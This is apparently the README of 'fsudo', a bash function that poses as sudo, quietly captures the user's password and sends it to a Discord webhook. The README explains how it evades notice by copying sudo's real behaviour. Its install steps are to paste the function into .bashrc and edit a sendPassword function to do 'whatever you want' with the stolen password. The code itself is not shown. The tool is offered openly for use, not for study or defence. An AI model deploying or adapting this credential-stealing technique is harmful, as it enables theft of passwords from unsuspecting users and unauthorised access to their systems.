# fsudo
It's just a bash function to steal the users password, while trying to be stealth handling scenarios like the user asking for the sudo help or the user giving the wrong password among other scenarios.

# Install
```bash
Update the discord link in the script.
Copy past the script directly into .bashrc or similar file
```

# Get the password
Just edit the function `sendPassword` to do whatever you want with the password.

# Thanks

The technik is very old and known but the original source were forked from here: https://github.com/mthbernardes/fsudo
I just updated to match the real sudo behavior and send it to discord.
